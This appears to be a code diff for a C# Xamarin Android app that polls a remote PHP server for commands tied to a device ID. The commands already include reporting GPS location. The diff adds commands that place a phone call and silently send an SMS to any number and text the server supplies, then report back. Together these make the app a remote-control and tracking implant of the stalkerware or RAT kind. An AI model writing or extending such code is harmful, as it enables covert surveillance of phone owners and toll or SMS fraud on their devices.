@@ -12,6 +12,7 @@ using Android.Views;
 using Android.Widget;
 using SQLite;
 using System.IO;
+using Android.Telephony;
 
 
 namespace KotysAndroidCsharp2
@@ -33,7 +34,7 @@ namespace KotysAndroidCsharp2
            
 
             //start v2
-            apicall.addReport("Device started");
+            apicall.addReport("Application opened");
 
             t2.Interval = 900000; // = 15 minutes in ms
             t2.Elapsed += new System.Timers.ElapsedEventHandler(t2_Elapsed);
@@ -87,16 +88,21 @@ namespace KotysAndroidCsharp2
             return null;
         }
 
-     
-
        void getCommandToDo()
        {
            WebClient wc = new WebClient();
            string get = wc.DownloadString(APIUrl + "getLastCommand.php?t1=" + devID); // TREBUIE TESTAT
-           string[] aux = get.Split('~');
-           string command = aux[0];
-           string Identifier = aux[1];
-           doCommand(command, Identifier);
+           if (get == "402")
+           {
+               
+           }
+           else
+           {
+               string[] aux = get.Split('~');
+               string command = aux[0];
+               string Identifier = aux[1];
+               doCommand(command, Identifier);
+           }
            
        }
 
@@ -108,6 +114,8 @@ namespace KotysAndroidCsharp2
                case "101": toastIT(commands.Substring(3)); apicall.markItAsDone(Identifiers); apicall.addReport("Toast:" + commands.Substring(3)); break;
                case "102": SendNotification(commands.Substring(3)); apicall.markItAsDone(Identifiers); apicall.addReport("Notification:" + commands.Substring(3));  break;
                case "103": getGPS(devID, Identifiers); apicall.markItAsDone(Identifiers); break;
+               case "104": callNumber(commands.Substring(3)); apicall.markItAsDone(Identifiers); apicall.addReport("CalledNumber:" + commands.Substring(3)); break;
+               case "105": sendSMS(commands.Substring(3)); apicall.markItAsDone(Identifiers); apicall.addReport("SMS:" + commands.Substring(3)); break;
                default: SendNotification("FAIL"); break;
            }
           
@@ -154,6 +162,26 @@ namespace KotysAndroidCsharp2
            
        }
 
+       void callNumber(string number)
+       {
+           var uri = Android.Net.Uri.Parse("tel:" + number);
+           var intent = new Intent(Intent.ActionView, uri);
+           StartActivity(intent);
+       }
+
+       void sendSMS(string get)
+       {
+           string[] trimmed = get.Split('\\');
+           string number = trimmed[0];
+           string message = trimmed[1];
+
+           SmsManager.Default.SendTextMessage(number, null,message, null, null);
+
+           //var smsUri = Android.Net.Uri.Parse("smsto:"+number);
+           //var smsIntent = new Intent(Intent.ActionSendto, smsUri);
+           //smsIntent.PutExtra("sms_body", message);
+           //StartActivity(smsIntent);
+       }
       
         
     }
